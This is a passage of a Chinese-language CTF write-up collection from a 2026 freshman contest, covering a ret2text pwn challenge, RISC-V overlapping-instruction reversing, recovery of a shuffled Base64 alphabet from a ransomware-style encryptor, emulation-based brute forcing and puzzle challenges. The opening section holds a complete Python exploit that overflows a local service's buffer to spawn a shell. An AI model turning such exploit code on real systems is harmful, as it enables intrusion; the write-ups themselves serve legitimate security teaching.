```text
0x50 + 8 = 0x58 = 88 字节
```

payload：

```text
41 × 88 | ff 12 40 00 00 00 00 00
填充区   | 返回地址
```

把 96 字节当 big-endian 整数转三进制，映射成 `h/y/w`。地址本身在 payload 里仍是 little-endian。

### 拿 shell

`win` 调 `system("/bin/sh")`。之前 `setup_flag_env` 会在临时目录写 `flag`，shell 里 `cat flag` 即可。

```text
What's your name (hyw)? Got 96 byte(s).
Goodbye!
[+] Nice! The ternary decoder worked for you.
[+] Enjoy your shell.
flag{aeda7a03-fbc2-1d9d-5ffe-d2458ac90584}
```

### exp

```python
#!/usr/bin/env python3
"""Exploit the ternary ret2text service and print its flag."""
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = int(sys.argv[1])
ALPHABET = b"hyw"
WIN = 0x4012FF
OFFSET = 0x50 + 8


def encode_base3(data: bytes) -> bytes:
    value = int.from_bytes(data, "big")
    digits = bytearray()
    while value:
        value, digit = divmod(value, 3)
        digits.append(ALPHABET[digit])
    return bytes(reversed(digits)) or ALPHABET[:1]


payload = b"A" * OFFSET + struct.pack("<Q", WIN)
encoded = encode_base3(payload)
assert int.from_bytes(payload, "big") == sum(
    ALPHABET.index(ch) * 3 ** (len(encoded) - i - 1)
    for i, ch in enumerate(encoded)
)
assert len(encoded) < 0x800 - 1

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    sock.settimeout(5)
    received = bytearray()
    while b"What's your name (hyw)? " not in received:
        chunk = sock.recv(4096)
        if not chunk:
            raise SystemExit("service closed before the input prompt")
        received.extend(chunk)
    sock.sendall(encoded + b"\n")

    while b"[+] Enjoy your shell." not in received:
        chunk = sock.recv(4096)
        if not chunk:
            raise SystemExit("service closed before starting the shell")
        received.extend(chunk)
    sock.sendall(b"cat flag; exit\n")
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        received.extend(chunk)

sys.stdout.buffer.write(received)
```

### flag

```text
flag{aeda7a03-fbc2-1d9d-5ffe-d2458ac90584}
```



<div style="page-break-before: always;"></div>


## crisc

### 先看看

`crisc.elf` 才 1808 字节，去符号的 RV64 小端 ELF，入口 `0x10120`，带 RVC。没库函数，全靠 syscall。

正常入口调 `0x10254` 那段，看起来就是一堆加法，逆出来是个 `fakeflag{...}`，还嘴硬说 RISC-V 32 位指令必须四字节对齐。既然有 RVC，试试从 `0x10256`（错两位）解——果然是另一条重叠指令流，乘法 / 异或 / 循环移位都会用到邻块参数。

| 区域 | VA | 作用 |
| --- | --- | --- |
| `.text` | `0x10120` | 代码 |
| `.rodata` | `0x10460` | 含两张交错比较表 |
| 输入缓冲 | `0x11530` | 72 字节 BSS |
| 正常变换 | `0x10254` | 加法假路径 |
| 重叠变换 | `0x10256` | 真路径 |

### 输入

读循环大概是：

```python
n = 0
while True:
    k = read(0, buffer + n, 65 - n)
    if k < 0:
        reject()
    if k == 0:
        break
    n += k
    if buffer[n - 1] == 0x0a:
        n -= 1
        buffer[n] = 0
        break
    if n == 65:
        reject()

if n != 63:
    reject()
```

常规：63 字节内容 + LF（或 EOF），参与运算的是 64 字节（末尾补零）。改输入前先存首字节最低位：

```asm
0x10180: lbu  s2, 0(s0)
0x10184: andi s2, s2, 1
```

`parity = input[0] & 1`，决定最后用哪张表。

### 假路径 → fakeflag

入口把 `s4` 设成 `0x10254`。调用前：

```asm
0x101b0: ld   t1, 0(s3)
0x101b4: ld   s9, 0(s8)
0x101b8: ori  a7, s9, 1
0x101bc: jalr s4
0x101c0: sd   a0, 0(s3)
```

`t1` 当前块，`s9` 邻块，`a7 = s9|1`。按 `0x10254` 看，真正影响返回值的只有一串 `addi`，等价于：

```python
def F_normal(x):
    return (x + 0x5b61) & ((1 << 64) - 1)
```

八轮 × 八块 × 八次：

```text
8 × 0x5b61 = 0x2db08
```

偶数表减回去：

```text
目标值：0x67616c66656e3c6e
减增量：0x000000000002db08
原始值：0x67616c66656b6166
小端字节：66 61 6b 65 66 6c 61 67
ASCII：fakeflag
```

拼起来：

```text
fakeflag{RISC_V_32b1t_instructi0ns_us3_str1ct_4_byte_4lignment}
```

Unicorn 跑正常入口确实 `accepted`。但这是诱饵：邻块参数没用上，字符串还自称 `fakeflag`。

### 真路径：错位解码

`.rodata` 里 `OVMIXv2!` 后面是长度 63、以及两张交错表。选表：

```python
target[i] = read_u64_le(0x10490 + 16 * i + 8 * parity)
```

机器码从 `0x10254` 起：

```text
0x10254  13 03 33 03  13 03 13 43  13 05 33 43  93 01 13 53
0x10264  93 62 33 03
```

正常四字节对齐 vs 从 `0x10256` 错位：

```text
正常分组：13 03 [33 03] [13 03] 13 43 13 05 33 43 ...
错位分组：      [33 03 13 03] [13 43 13 05] [33 43 93 01] ...
```

```asm
; 从 0x10254 开始
0x10254: addi t1, t1, 0x33
0x10258: addi t1, t1, 0x431
0x1025c: addi a0, t1, 0x433
0x10260: addi gp, t1, 0x531

; 从 0x10256 开始
0x10256: mul  t1, t1, a7
0x1025a: xori t1, t1, 0x51
0x1025e: xor  t1, t1, s9
0x10262: rori t1, t1, 0x29
```

RVC 允许半字边界，错位流里的 mul/xor/rori 正好吃掉邻块寄存器。Capstone 会在 `rori` 卡死，Ghidra/SLEIGH 能解完 128 条到共享 `ret`。脚本按字段手解：

```python
opcode = w & 0x7f
rd     = (w >> 7) & 0x1f
funct3 = (w >> 12) & 7
rs1    = (w >> 15) & 0x1f
rs2    = (w >> 20) & 0x1f
funct7 = w >> 25
```

结尾：

```asm
0x1044e: addi a0, t1, 0x51
0x10452: addi a0, a0, 2
```

返回前再 `+0x53`。注意全程 `& ((1<<64)-1)`，不然乘法高位会污染后面的旋转。

前两块试跑：

```text
x = 0x527b667463756877    对应 b'whuctf{R'
y = 0x32335f562d435349    对应 b'ISC-V_32'
m = y | 1 = 0x32335f562d435349

mul  后：0xd643df80af7e5eef
xori 后：0xd643df80af7e5ebe
xor  后：0xe47080d6823d0df7
rori 后：0x6b411e86fbf23840
```

### 求逆

| 正向 | 逆向 |
| --- | --- |
| `x+y` / `x^y` / `x+imm` / `x^imm` | 对应减或再异或 |
| `x*m` | `x * inverse(m)` |
| `ROR64(x,k)` | `ROL64(x,k)` |

```python
inverse_m = pow(y | 1, -1, 1 << 64)
x = (x * inverse_m) & MASK
```

例：

```text
m         = 0x32335f562d435349
inverse_m = 0x7ce586ba5d460ef9
m × inverse_m mod 2^64 = 1
```

必须按原 128 条倒序撤，不能按类型合并。

### 八轮原地更新

正向：

```python
for _ in range(8):
    for i in range(8):
        words[i] = F(words[i], words[(i + 1) % 8])
```

一轮里赋值立刻生效：

```text
b0 = F(a0, a1)
b1 = F(a1, a2)
b2 = F(a2, a3)
b3 = F(a3, a4)
b4 = F(a4, a5)
b5 = F(a5, a6)
b6 = F(a6, a7)
b7 = F(a7, b0)
```

逆一轮要从块 7 撤到块 0：

```text
a7 = inverse_F(b7, b0)
a6 = inverse_F(b6, a7)
a5 = inverse_F(b5, a6)
...
a1 = inverse_F(b1, a2)
a0 = inverse_F(b0, a1)
```

```python
for _ in range(8):
    for i in range(7, -1, -1):
        words[i] = inverse_F(words[i], words[(i + 1) % 8])
```

奇数表逆推快照（节选见下；完整在脚本报告里）：

```text
qword 0: expected=8b264ee9092f1fc0 actual=8b264ee9092f1fc0 match=True
qword 1: expected=a37ace917206a13f actual=a37ace917206a13f match=True
qword 2: expected=ce2befe58309ad33 actual=ce2befe58309ad33 match=True
qword 3: expected=5142fc0cbe0f4951 actual=5142fc0cbe0f4951 match=True
qword 4: expected=cac54f123ee1f20d actual=cac54f123ee1f20d match=True
qword 5: expected=333de521e5ad6cb1 actual=333de521e5ad6cb1 match=True
qword 6: expected=7d8edd1ab5fca271 actual=7d8edd1ab5fca271 match=True
qword 7: expected=140cc17ea4ca777e actual=140cc17ea4ca777e match=True
```

Unicorn 对 `rori` 做语义 hook，64 次调用全部对上八个目标。改一字节再跑会 `rejected`。

### exp

```powershell
python solve_overlap.py crisc.elf
```

带报告：

```powershell
python solve_overlap.py crisc.elf --report result.json
```

完整脚本：

```python
from __future__ import annotations

import hashlib
import json
import struct
import argparse
from pathlib import Path

MOD = 1 << 64
MASK = MOD - 1


def va_offset(blob: bytes, address: int, size: int = 4) -> int:
    assert blob[:6] == b'\x7fELF\x02\x01'
    phoff = struct.unpack_from('<Q', blob, 0x20)[0]
    entsize, count = struct.unpack_from('<HH', blob, 0x36)
    for i in range(count):
        kind, _, offset, va, _, filesz, _, _ = struct.unpack_from('<II6Q', blob, phoff + i * entsize)
        if kind == 1 and va <= address and address + size <= va + filesz:
            return offset + address - va
    raise ValueError(f'Address outside file-backed load segment: {address:#x}')


def rol(x: int, n: int) -> int:
    n %= 64
    return ((x << n) | (x >> ((64 - n) % 64))) & MASK


def decode_ops(blob: bytes, start: int, count: int):
    result = []
    for i in range(count):
        addr = start + 4 * i
        offset = va_offset(blob, addr)
        raw = blob[offset:offset + 4]
        w = int.from_bytes(raw, 'little')
        opcode, rd, f3 = w & 127, (w >> 7) & 31, (w >> 12) & 7
        rs1, rs2, f7 = (w >> 15) & 31, (w >> 20) & 31, w >> 25
        imm = w >> 20
        if imm & 0x800:
            imm -= 0x1000
        if opcode == 0x33 and rd == rs1 == 6:
            spec = {(0, 0, 25): ('add_neighbor', 0),
                    (0, 4, 25): ('xor_neighbor', 0),
                    (1, 0, 17): ('mul_odd_neighbor', 0)}
            op, arg = spec[(f7, f3, rs2)]
        elif opcode == 0x13 and rd == rs1 == 6 and f3 == 5 and w >> 26 == 0x18:
            op, arg = 'ror', (w >> 20) & 63
        elif opcode == 0x13 and rd == rs1 == 6 and f3 in (0, 4):
            op, arg = ('add_imm' if f3 == 0 else 'xor_imm'), imm
        elif opcode == 0x13 and f3 == 0 and (rd, rs1) in ((10, 6), (10, 10)):
            op, arg = 'add_imm', imm
        else:
            raise ValueError(f'Unsupported instruction {addr:#x}: {w:08x}')
        result.append({'address': hex(addr), 'raw': raw.hex(), 'op': op, 'arg': arg})
    return result


def transform(x: int, y: int, ops, inverse=False) -> int:
    for item in reversed(ops) if inverse else ops:
        op, arg = item['op'], item['arg']
        if op == 'add_neighbor':
            x += -y if inverse else y
        elif op == 'xor_neighbor':
            x ^= y
        elif op == 'mul_odd_neighbor':
            x *= pow(y | 1, -1, MOD) if inverse else y | 1
        elif op == 'ror':
            x = rol(x, arg if inverse else -arg)
        elif op == 'add_imm':
            x += -arg if inverse else arg
        elif op == 'xor_imm':
            x ^= arg & MASK
        else:
            raise ValueError(op)
        x &= MASK
    return x


def mix(words, ops, rounds=8, inverse=False):
    words = list(words)
    for _ in range(rounds):
        for i in range(7, -1, -1) if inverse else range(8):
            words[i] = transform(words[i], words[(i + 1) % 8], ops, inverse)
    return words


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('elf', type=Path)
    parser.add_argument('--report', type=Path)
    args = parser.parse_args()
    blob = args.elf.read_bytes()
    rodata = blob[blob.index(b'OVMIXv2!'):]
    signature, length, word_count, rounds, count, carrier = struct.unpack_from('<8s5Q', rodata)
    assert (length, word_count, rounds, count) == (63, 8, 8, 128)
    ops = decode_ops(blob, 0x10256, count)
    report = {'sha256': hashlib.sha256(blob).hexdigest(),
              'metadata': {'signature': signature.decode(), 'length': length,
                           'word_count': word_count, 'rounds': rounds,
                           'instruction_count': count, 'carrier_address': hex(carrier)},
              'overlap_start': hex(0x10256), 'operations': ops, 'candidates': []}
    selected = []
    for parity in (0, 1):
        targets = [struct.unpack_from('<Q', rodata, 0x30 + 16 * i + 8 * parity)[0]
                   for i in range(8)]
        plain = mix(targets, ops, inverse=True)
        raw = struct.pack('<8Q', *plain)
        replay = mix(plain, ops)
        item = {'parity': parity, 'hex': raw.hex(), 'repr': repr(raw),
                'branch_consistent': (raw[0] & 1) == parity,
                'length_consistent': len(raw) == 64 and raw[-1] == 0,
                'roundtrip_matches': replay == targets,
                'targets': [hex(x) for x in targets],
                'replay': [hex(x) for x in replay]}
        report['candidates'].append(item)
        if item['branch_consistent'] and item['length_consistent'] and item['roundtrip_matches']:
            selected.append(raw[:-1])
    assert len(selected) == 1
    flag = selected[0].decode('ascii')
    assert len(selected[0]) == length and '\0' not in flag
    report['flag'] = flag
    if args.report:
        args.report.write_text(json.dumps(report, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
    print('overlapping instructions:', count)
    print('forward replay: all 8 qwords match')
    print(flag)


if __name__ == '__main__':
    main()
```

### flag

whuctf{RISC-V_32b1t_instRucti0n_1s_d1ffiCult_to_Mem0riz3_1F605}



<div style="page-break-before: always;"></div>


## LostTable

### 先看看

zip 里有 `encrypt`、几份 `.enc`、明文 `how2decrypt.txt` 等。`encrypt` 是 strip 过的 PIE，导入了 `rand/srand/time/clock`，字符串里有 `whuctf_2026`、`LT_TABLE`、标准 Base64 表。

### 流程

```text
r2 -A -q -c 'pdf @ 0x1389; pdf @ 0x145d; pdf @ 0x1655; pdf @ 0x1a13; pdf @ 0x1cc1' encrypt
```

字母表：环境变量 `LT_TABLE` 长度 64 就直接用，否则 Fisher–Yates 洗牌（种子靠 `time/clock`，默认跑不稳定）。然后自定义 Base64，再过一层改过的 RC4 风格流：

KSA（key=`whuctf_2026`）：

```text
j = (j + S[i] + key[i mod key_length]) mod 256
swap(S[i], S[j])
```

PRGA 取值也改了：

```text
i = (i + 1) mod 256
j = (j + S[i]) mod 256
swap(S[i], S[j])
k = S[(S[i] * S[j] + 0x72) mod 256]
output = input XOR k XOR 0x37
```

可逆。解密：同一变换还原 → 自定义表换回标准表 → 普通 Base64 解码。

### 已知明文抠表

`how2decrypt.txt` 243 字节 ↔ 密文 324 字节。变换后的自定义 Base64 跟标准编码逐位对照，能定 59/64 项；剩下 `2Nbcz` 的 5! = 120 种排列，拿 `whuctf_logo.png.enc` 验 PNG 结构，唯一通过的是：

```text
C6UnkK8dsa1STyFNVojOElpBXMDw5h4zmWZP9tf0xqR+JHLvui/7Q3GgAIecrYb2
```

PNG 1260×1284，块 CRC 全对。三份密文都能 roundtrip；`LT_TABLE` 喂回原 ELF 重加密也逐字节一致。

### exp

```python
#!/usr/bin/env python3
"""Recover LostTable's shuffled Base64 alphabet and decrypt the artifacts."""

from __future__ import annotations

import base64
import hashlib
import itertools
import json
import re
import struct
import zlib
import zipfile
from pathlib import Path


# Run with the supplied losttable.zip attachment in the current directory.
STD_ALPHABET = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
KEY = b"whuctf_2026"
PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"
INPUTS: dict[str, bytes] = {}


def read_input(name: str) -> bytes:
    return INPUTS[name]


def stream_xor(data: bytes) -> bytes:
    """Apply the tool's RC4-like stream transform; it is its own inverse."""
    state = bytearray(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + KEY[i % len(KEY)]) & 0xFF
        state[i], state[j] = state[j], state[i]

    out = bytearray()
    i = j = 0
    for value in data:
        i = (i + 1) & 0xFF
        j = (j + state[i]) & 0xFF
        state[i], state[j] = state[j], state[i]
        stream_byte = state[(state[i] * state[j] + 0x72) & 0xFF]
        out.append(value ^ stream_byte ^ 0x37)
    return bytes(out)


def encode_custom(data: bytes, alphabet: bytes) -> bytes:
    standard = base64.b64encode(data)
    return standard.translate(bytes.maketrans(STD_ALPHABET, alphabet))


def decode_custom(encoded: bytes, alphabet: bytes) -> bytes:
    standard = encoded.translate(bytes.maketrans(alphabet, STD_ALPHABET))
    return base64.b64decode(standard, validate=True)


def inspect_png(data: bytes) -> dict[str, object] | None:
    """Accept a PNG only when its structure and every chunk CRC are valid."""
    if not data.startswith(PNG_SIGNATURE):
        return None

    pos = len(PNG_SIGNATURE)
    chunks: list[dict[str, object]] = []
    saw_iend = False
    while pos < len(data):
        if pos + 12 > len(data):
            return None
        size = struct.unpack_from(">I", data, pos)[0]
        kind = data[pos + 4 : pos + 8]
        end = pos + 12 + size
        if end > len(data):
            return None
        payload = data[pos + 8 : pos + 8 + size]
        stored_crc = struct.unpack_from(">I", data, pos + 8 + size)[0]
        if zlib.crc32(kind + payload) & 0xFFFFFFFF != stored_crc:
            return None
        if not chunks and (kind != b"IHDR" or size != 13):
            return None
        chunks.append({"type": kind.decode("ascii"), "size": size})
        if kind == b"IEND":
            if size != 0 or end != len(data):
                return None
            saw_iend = True
            break
        pos = end

    if not saw_iend:
        return None
    width, height = struct.unpack_from(">II", data, len(PNG_SIGNATURE) + 8)
    if width == 0 or height == 0:
        return None
    return {"width": width, "height": height, "chunks": chunks}


def recover_alphabet() -> tuple[bytes, bytes, dict[str, object], list[int], bytes]:
    known_plain = read_input("how2decrypt.txt")
    known_cipher = read_input("how2decrypt.txt.enc")
    known_custom_b64 = stream_xor(known_cipher)
    known_standard_b64 = base64.b64encode(known_plain)
    if len(known_custom_b64) != len(known_standard_b64):
        raise ValueError("Known plaintext and ciphertext lengths do not match")

    partial: list[int | None] = [None] * 64
    for standard_byte, custom_byte in zip(known_standard_b64, known_custom_b64):
        if standard_byte == ord("="):
            if custom_byte != ord("="):
                raise ValueError("Base64 padding changed in the encrypted sample")
            continue
        index = STD_ALPHABET.index(standard_byte)
        if partial[index] not in (None, custom_byte):
            raise ValueError(f"Conflicting alphabet mapping at index {index}")
        partial[index] = custom_byte

    missing = [index for index, value in enumerate(partial) if value is None]
    known_symbols = {value for value in partial if value is not None}
    remaining = sorted(set(STD_ALPHABET) - known_symbols)
    if len(missing) != len(remaining):
        raise ValueError("Recovered mappings do not form a Base64 alphabet permutation")

    logo_cipher = read_input("whuctf_logo.png.enc")
    logo_custom_b64 = stream_xor(logo_cipher)
    valid: list[tuple[bytes, bytes, dict[str, object]]] = []
    for assignment in itertools.permutations(remaining):
        candidate = list(partial)
        for index, symbol in zip(missing, assignment):
            candidate[index] = symbol
        alphabet = bytes(candidate)
        try:
            logo = decode_custom(logo_custom_b64, alphabet)
        except (ValueError, base64.binascii.Error):
            continue
        info = inspect_png(logo)
        if info is not None:
            valid.append((alphabet, logo, info))

    if len(valid) != 1:
        raise ValueError(f"Expected one PNG-valid alphabet, found {len(valid)}")
    alphabet, logo, info = valid[0]
    return alphabet, logo, info, missing, bytes(remaining)


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def main() -> None:
    with zipfile.ZipFile("losttable.zip") as archive:
        for member in archive.infolist():
            if member.is_dir():
                continue
            name = member.filename.rsplit("/", 1)[-1]
            if name in INPUTS:
                raise ValueError(f"Duplicate attachment filename: {name}")
            INPUTS[name] = archive.read(member)
    required = {"flag.txt.enc", "how2decrypt.txt", "how2decrypt.txt.enc", "whuctf_logo.png.enc"}
    missing = sorted(required - INPUTS.keys())
    if missing:
        raise ValueError(f"Missing attachment members: {missing}")

    alphabet, logo, png_info, missing, remaining = recover_alphabet()
    encrypted_names = {
        "flag.txt": "flag.txt.enc",
        "how2decrypt.txt": "how2decrypt.txt.enc",
        "whuctf_logo.png": "whuctf_logo.png.enc",
    }

    outputs: dict[str, bytes] = {}
    roundtrips: dict[str, bool] = {}
    for output_name, encrypted_name in encrypted_names.items():
        encrypted = read_input(encrypted_name)
        raw = decode_custom(stream_xor(encrypted), alphabet)
        outputs[output_name] = raw
        roundtrips[output_name] = stream_xor(encode_custom(raw, alphabet)) == encrypted
        if not roundtrips[output_name]:
            raise ValueError(f"Encryptor round-trip failed for {encrypted_name}")

    if outputs["how2decrypt.txt"] != read_input("how2decrypt.txt"):
        raise ValueError("Decrypted ransom note differs from the supplied plaintext")
    if outputs["whuctf_logo.png"] != logo or inspect_png(logo) != png_info:
        raise ValueError("PNG validation changed between alphabet recovery and output")

    flag = outputs["flag.txt"]
    if not re.fullmatch(rb"flag\{[\x20-\x7e]+\}", flag):
        raise ValueError("Recovered bytes do not match the stated flag format")
    flag.decode("ascii")

    for name, raw in outputs.items():
        (Path("recovered_" + name)).write_bytes(raw)

    evidence = {
        "kind": "reconstructed_logic",
        "input_ciphertexts": {
            name: {
                "filename": name,
                "sha256": sha256(read_input(name)),
            }
            for name in encrypted_names.values()
        },
        "algorithm": {
            "key": KEY.decode("ascii"),
            "post_stream_xor": "0x37",
            "stream_index": "(S[i] * S[j] + 0x72) mod 256",
            "encoding": "Base64 with a shuffled 64-byte alphabet",
        },
        "alphabet_recovery": {
            "known_plaintext": "how2decrypt.txt",
            "mapped_indexes": 64 - len(missing),
            "missing_indexes": missing,
            "unused_symbols": remaining.decode("ascii"),
            "png_valid_candidates": 1,
            "alphabet": alphabet.decode("ascii"),
        },
        "png_validation": {
            "bytes": len(logo),
            "sha256": sha256(logo),
            **png_info,
        },
        "outputs": {
            name: {"filename": f"recovered_{name}", "bytes": len(raw), "sha256": sha256(raw)}
            for name, raw in outputs.items()
        },
        "checks": {
            "known_plaintext_exact_match": True,
            "all_ciphertexts_round_trip_byte_for_byte": roundtrips,
            "flag_ascii": True,
            "flag_format": True,
        },
    }
    evidence_file = Path("recovery.json")
    evidence_file.write_text(json.dumps(evidence, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    print(f"Known-plaintext alphabet indexes: {64 - len(missing)}/64")
    print(f"Missing indexes: {missing}; unused symbols: {remaining.decode('ascii')}")
    print("PNG-valid alphabet candidates: 1")
    print(f"Recovered alphabet: {alphabet.decode('ascii')}")
    print(f"PNG: {len(logo)} bytes, {png_info['width']}x{png_info['height']}, all chunk CRCs valid")
    print(f"Recovered flag: {flag.decode('ascii')}")
    print(f"Ciphertext round-trips: {roundtrips}")
    print("Evidence: recovery.json")


if __name__ == "__main__":
    main()
```

### flag

```
flag{y0u_r3bu1lt_th3_shuffl3d_b64_t4bl3}
```



<div style="page-break-before: always;"></div>


## move_on

### 先看看

x86-64 ELF，UPX 壳，61,856 字节。题面说“冲刺”“挖秃”。先解包，找输入缓冲和比较常量，再看变换能不能拆成小块穷举。

### 解包

UPX 解掉之后进 IDA。`main` 在 `0x40588b`：清零 `0x4285a0` 起的 64 字节，`fgets(buffer, 65, stdin)` 读进来，调 `sub_405830`，再跟 `0x408040`（文件偏移 `0x7040`）那 64 字节常量逐字节比，对了就 `You are right!`。

### 调用顺序

`sub_405830` 两轮，每轮 A (`0x4011b4`) → 指针 +0x10 → B (`0x403442`) → 再 +0x10：

| 输入字节 | 两字节组 | 函数 |
| --- | --- | --- |
| `0x00–0x0f` | 0–7 | A |
| `0x10–0x1f` | 8–15 | B |
| `0x20–0x2f` | 16–23 | A |
| `0x30–0x3f` | 24–31 | B |

A/B 每次各管 16 字节、8 组相邻字节，组间没依赖。函数体很长，容易误以为一次盖 32 字节；用重复字节对跑一下，确认每次只改 16，跟调用方的 `0x10` 步长对得上。

### 穷举映射

里面有 GF(256) 乘法表和 XOR 表，手推太烦。angr 在动态表索引上也很慢，于是直接 Unicorn 跑解包 ELF 里的 A/B：对每个 `0x0000–0xffff`，把同一对字节塞进函数 8 个位置，执行一次就拿到该函数 8 张映射。实测每张都是双射，可以建完整逆表。

目标常量按两字节一组（大端）查逆表，拼回 64 字节候选。

### 验证

比较前断点读回缓冲区：

```text
8d3375fa1db9e9e99557098a0b7704040f54ba81739e213227c2e6dd50f2768
2608e191173d97586b98577416cf35061fdd2ce11bf72a6e34492d352b2b564b8
```

跟文件偏移 `0x7040` 的常量一致。候选丢给原始打包程序，输出 `You are right!`。

这里懒得手推内部运算，就直接 Unicorn 穷举了。

### 完整脚本

解包后的 ELF 从 stdin 喂进去：

```python
from __future__ import annotations

import json
import struct
import sys

from unicorn import Uc, UC_ARCH_X86, UC_MODE_64, UC_PROT_ALL
from unicorn.x86_const import UC_X86_REG_RSP


ELF = sys.stdin.buffer.read()
if not ELF:
    raise SystemExit("supply the unpacked ELF bytes on standard input")
BUFFER = 0x4285A0
STACK = 0x70000000
STACK_SIZE = 0x10000
RETURN = 0x70010000
FUNCTIONS = {"A": 0x4011B4, "B": 0x403442}
MAP_SIZE = 1 << 16


def down(value: int) -> int:
    return value & ~0xFFF


def up(value: int) -> int:
    return (value + 0xFFF) & ~0xFFF


def create_machine() -> Uc:
    uc = Uc(UC_ARCH_X86, UC_MODE_64)
    program_header_offset = struct.unpack_from("<Q", ELF, 32)[0]
    program_header_size, program_header_count = struct.unpack_from("<HH", ELF, 54)
    for index in range(program_header_count):
        values = struct.unpack_from("<IIQQQQQQ", ELF,
                                    program_header_offset + index * program_header_size)
        kind, _, file_offset, virtual_address, _, file_size, memory_size, _ = values
        if kind != 1:  # PT_LOAD
            continue
        start = down(virtual_address)
        end = up(virtual_address + memory_size)
        uc.mem_map(start, end - start, UC_PROT_ALL)
        uc.mem_write(virtual_address, b"\0" * memory_size)
        uc.mem_write(virtual_address, ELF[file_offset:file_offset + file_size])

    uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)
    uc.mem_map(RETURN, 0x1000, UC_PROT_ALL)
    rsp = STACK + STACK_SIZE - 0x100
    uc.mem_write(rsp, struct.pack("<Q", RETURN))
    uc.reg_write(UC_X86_REG_RSP, rsp)
    uc.mem_write(0x4285E0, struct.pack("<Q", BUFFER))
    for i in range(256):
        uc.mem_write(0x428E00 + 8 * i, struct.pack("<Q", 0x428380 + i))
        uc.mem_write(0x429E00 + 8 * i, struct.pack("<Q", 0x418080 + (i << 8)))
        uc.mem_write(0x42A600 + 8 * i, struct.pack("<Q", 0x408080 + (i << 8)))
    return uc


def inverse_maps(uc: Uc, name: str) -> list[bytearray]:
    result = [bytearray(MAP_SIZE * 2) for _ in range(8)]
    seen = [bytearray(MAP_SIZE) for _ in range(8)]
    rsp = STACK + STACK_SIZE - 0x100
    for value in range(MAP_SIZE):
        pair = value.to_bytes(2, "big")
        uc.mem_write(BUFFER, pair * 8)
        uc.reg_write(UC_X86_REG_RSP, rsp)
        uc.mem_write(rsp, struct.pack("<Q", RETURN))
        uc.emu_start(FUNCTIONS[name], RETURN, count=100_000)
        output = bytes(uc.mem_read(BUFFER, 16))
        for step in range(8):
            mapped = int.from_bytes(output[2 * step:2 * step + 2], "big")
            if seen[step][mapped]:
                raise ValueError(f"{name}[{step}] is not one-to-one")
            seen[step][mapped] = 1
            result[step][2 * mapped:2 * mapped + 2] = pair
    return result


def solve() -> bytes:
    target = ELF[0x7040:0x7080]
    if len(target) != 64:
        raise ValueError("target constant is not 64 bytes")
    uc = create_machine()
    inverses = {name: inverse_maps(uc, name) for name in ("A", "B")}
    result = bytearray()
    for pair_index in range(32):
        if pair_index < 8:
            name, step = "A", pair_index
        elif pair_index < 16:
            name, step = "B", pair_index - 8
        elif pair_index < 24:
            name, step = "A", pair_index - 16
        else:
            name, step = "B", pair_index - 24
        mapped = int.from_bytes(target[2 * pair_index:2 * pair_index + 2], "big")
        inverse = inverses[name][step]
        result.extend(inverse[2 * mapped:2 * mapped + 2])
    return bytes(result)


if __name__ == "__main__":
    candidate = solve()
    print(json.dumps({
        "input_hex": candidate.hex(),
        "input_length": len(candidate),
        "input_ascii": candidate.decode("ascii"),
        "contains_line_feed": b"\n" in candidate,
    }, indent=2))
```

### flag

```txt
WHUCTF{0mnipot3n7_m0v!!https://drwho.virtadpt.net/files/mov.pdf}
```



<div style="page-break-before: always;"></div>


## Project-Reverse

### 先看看

跟初音提示走，flag 全大写。源码站上三块：theme.ogg、解密后的 stage 音频、友链装饰图。

| 载荷 | 用途 |
| --- | --- |
| theme.ogg | 开头拼读 |
| stage.bin | 中间拼读 |
| decoration.png | 结尾 |

### 搜 Untitled

首页 Hint：`Seeing is not believing. Searching is!`

![Miku 提示](/blog-assets/writeups/WHUCTF2026新生赛WP/reverse/images/02-homepage-miku-hint.png)

搜索必须严格 `Untitled`：

![搜索](/blog-assets/writeups/WHUCTF2026新生赛WP/reverse/images/03-search-untitled.png)

文末：`why not go back to the entry page with iv="Colorful Stageee"?`

![文章](/blog-assets/writeups/WHUCTF2026新生赛WP/reverse/images/04-untitled-article.png)

### 反推 key

`stage.json`：

```json
{
  "check": [19, 29, 3, 5, 23, 5, 1, 76, 115, 54, 31, 0, 14, 12, 12, 12],
  "digest": "76cf97217cdeb96e2ce93f824e5362657aa2e743866beb7158f023a3c699dc2c"
}
```

校验：

```
key[i] XOR iv[i] == check[i]
```

```python
iv = b'Colorful Stageee'
check = [19, 29, 3, 5, 23, 5, 1, 76, 115, 54, 31, 0, 14, 12, 12, 12]
key = bytes(c ^ v for c, v in zip(check, iv))
print(key.decode())  # Project Sekaiiii
```

得 **key = Project Sekaiiii**。解密：

```python
import hashlib
seed = hashlib.sha256(key + b'\x00' + iv).digest()
# 用 seed 循环 XOR stage.bin 即可得到 OggS 音频
```

带参打开：

```
https://siestazzz.github.io/?key=Project%20Sekaiiii&iv=Colorful%20Stageee
```

弹 Ready，让去听 BGM 再去友链。

![Ready](/blog-assets/writeups/WHUCTF2026新生赛WP/reverse/images/05-ready-dialog.png)

### 听写

theme.ogg：

```
W. H. U. C. T. F. Open curly brace.
W. 3. 1.
```

→ `WHUCTF{W31`（末尾是数字 1）

stage：

```
c 0 m e underscore t o underscore t h e
```

→ `C0ME_TO_THE`

友链页装饰图：

![装饰](/blog-assets/writeups/WHUCTF2026新生赛WP/reverse/images/06-friends-decoration.png)

→ `_R3V3RS3_SEKAI!}`

### 拼接

```
WHUCTF{W31 + C0ME_TO_THE + _R3V3RS3_SEKAI!}
```

### flag

```
WHUCTF{W31C0ME_TO_THE_R3V3RS3_SEKAI!}
```



<div style="page-break-before: always;"></div>


## v1m

### 先看看

题面暗示 Vim。附件一个 ELF + 一份 Vim 脚本。输入 48 字节：`whuctf{` + 40 字节正文 + `}`。

### Vim 查表

正文写成数字表交给 Vim，ELF 里 `0x2100` 起 256 字节当 S-box（接近 AES，但 `0x52`/`0xf4` 两项对调了）。一组关键命令：

```vim
normal! 65G
normal! 0"ay$
execute "normal! \<C-A>"
